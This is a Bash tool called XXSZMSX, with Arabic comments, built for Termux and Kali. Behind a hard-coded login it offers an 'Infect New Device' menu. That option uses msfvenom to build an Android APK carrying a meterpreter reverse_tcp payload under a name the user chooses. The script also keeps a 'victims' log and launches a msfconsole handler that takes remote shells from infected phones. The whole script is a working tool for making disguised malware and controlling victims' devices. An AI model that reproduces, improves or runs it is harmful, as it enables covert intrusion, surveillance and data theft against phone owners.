cat << 'EOF' > xxszmsx.sh
#!/bin/bash
# =====================================================
# TOOL: XXSZMSX (COMPACT BLOOD EDITION)
# COMPATIBILITY: TERMUX & KALI (ALL SCREEN SIZES)
# =====================================================

# ألوان الدم الاحترافية
BRED='\e[1;31;1m'
RED='\e[0;31m'
NC='\e[0m'

LOG_FILE=".victims_log.txt"
DB_FILE=".studio_config"

# تحديد المسار التلقائي للحفظ
[[ -d "/data/data/com.termux/files/usr/bin" ]] && SAVE_DIR="/sdcard" || SAVE_DIR="$HOME/Desktop"

# --- [ واجهة الدخول ] ---
clear
echo -e "${BRED}┌──────────────────────────────────────┐"
echo -e "│       XXSZMSX : SYSTEM ACCESS        │"
echo -e "└──────────────────────────────────────┘${NC}"
echo -ne "${RED}[†] Identity: ${NC}"; read username
echo -ne "${RED}[†] Key: ${NC}"; read -s password
echo ""

if [[ "$username" != "user" || "$password" != "123456789" ]]; then
    echo -e "${BRED}[!] ERROR: ACCESS DENIED.${NC}"; exit 1
fi

# --- [ القائمة الرئيسية ] ---
while true; do
    clear
    echo -e "${BRED}"
    # رسمة اسم الأداة بحجم "ميني" عشان ما تتقطعش نهائياً
    echo "  __  __  __  __  ____  _____  __  __ "
    echo "  \ \/ /  \ \/ / / ___||__  / |  \/  |"
    echo "   \  /    \  /  \___ \  / /  | |\/| |"
    echo "   /  \    /  \   ___) |/ /_  | |  | |"
    echo "  /_/\_\  /_/\_\ |____//____| |_|  |_|"
    echo "      [ X X S Z M S X  V15.0 ]        "
    echo "--------------------------------------"
    echo -e "${RED} [1]${BRED} Infect New Device"
    echo -e "${RED} [2]${BRED} Blood-Logs (Victims)"
    echo -e "${RED} [3]${BRED} Start Controller"
    echo -e "${RED} [0]${BRED} System Exit"
    echo -e "--------------------------------------"
    echo -ne " XXSZMSX >> ${NC}"
    read choice

    case $choice in
        1) 
           clear
           echo -e "${BRED}[*] APK INFECTION MODE${NC}"
           echo "-------------------------------"
           read -p "[+] Name: " app_name
           read -p "[+] Icon URL: " icon_url
           read -p "[+] LHOST: " lh
           read -p "[+] LPORT: " lp
           echo "$lh:$lp" > "$DB_FILE"
           echo "[$(date +%H:%M)] $app_name | $lh" >> "$LOG_FILE"
           echo -e "${RED}[*] Injecting... Please wait.${NC}"
           msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp R > "$SAVE_DIR/$app_name.apk"
           echo -e "${BRED}[+] DONE: $SAVE_DIR/$app_name.apk${NC}"
           read -p "Press Enter..." ;;
        2)
           clear
           echo -e "${BRED}[*] VICTIMS DATABASE${NC}"
           echo "-------------------------------"
           [ -f "$LOG_FILE" ] && cat "$LOG_FILE" || echo "No data found."
           echo "-------------------------------"
           read -p "Press Enter..." ;;
        3) 
           clear
           if [ -f "$DB_FILE" ]; then
               IP=$(cut -d: -f1 "$DB_FILE"); PORT=$(cut -d: -f2 "$DB_FILE")
               echo -e "${RED}[*] Connecting to $IP...${NC}"
               msfconsole -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $IP; set LPORT $PORT; set ExitOnSession false; exploit -j"
           else
               echo -e "${BRED}[!] Error: No Config found.${NC}"; sleep 2
           fi ;;
        0) exit 0 ;;
    esac
done
EOF
